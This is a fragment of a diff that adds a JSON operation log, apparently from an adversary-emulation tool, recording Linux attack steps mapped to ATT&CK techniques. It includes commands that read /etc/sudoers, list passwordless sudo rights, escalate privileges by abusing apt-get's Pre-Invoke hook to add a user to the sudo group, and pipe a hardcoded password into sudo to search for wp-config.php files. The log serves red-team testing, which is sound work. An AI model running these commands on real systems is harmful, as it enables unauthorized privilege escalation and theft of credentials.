+                    "name": "Start 54ndc47 with password",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:40",
+                    "status": 1
+                },
+                {
+                    "ability_id": "0d7fd013-3310-4ff5-9c64-5cb99c282f46",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "sudo -l | grep '(root) NOPASSWD:'",
+                    "delegated": "2019-11-21 10:46:23.550864",
+                    "description": "View commands without password",
+                    "executor": "sh",
+                    "name": "Account Discovery",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:46",
+                    "status": 0
+                },
+                {
+                    "ability_id": "c02a8d8d-d5d1-44ad-b6e7-33f2739be0dc",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "cat /etc/sudoers",
+                    "delegated": "2019-11-21 10:46:23.551096",
+                    "description": "",
+                    "executor": "sh",
+                    "name": "View sudoers access",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:46:53",
+                    "status": 1
+                },
+                {
+                    "ability_id": "37744f41-89d1-4994-9acd-504272fb0170",
+                    "attack": {
+                        "tactic": "privilege-escalation",
+                        "technique_id": "T1169",
+                        "technique_name": "Sudo without password"
+                    },
+                    "command": "sudo apt-get update -o APT::Update::Pre-Invoke::='usermod -aG sudo helpdesk';",
+                    "delegated": "2019-11-21 10:46:23.551296",
+                    "description": "Sudo without password",
+                    "executor": "sh",
+                    "name": "Sudo",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:47:04",
+                    "status": 0
+                },
+                {
+                    "ability_id": "8ed2e092-5302-4f7f-afd7-e83e296b23e4",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1083",
+                        "technique_name": "File and Directory Discovery"
+                    },
+                    "command": "echo iloveyou | sudo -S su -c 'find / -name wp-config.php'",
+                    "delegated": "2019-11-21 10:46:23.551488",
+                    "description": "Find config file",
+                    "executor": "sh",
+                    "name": "Config File Discovery",
+                    "platform": "linux",
+                    "run": "2019-11-21 10:47:09",
+                    "status": 0
+                }
+            ]
+        }
+    }
+}
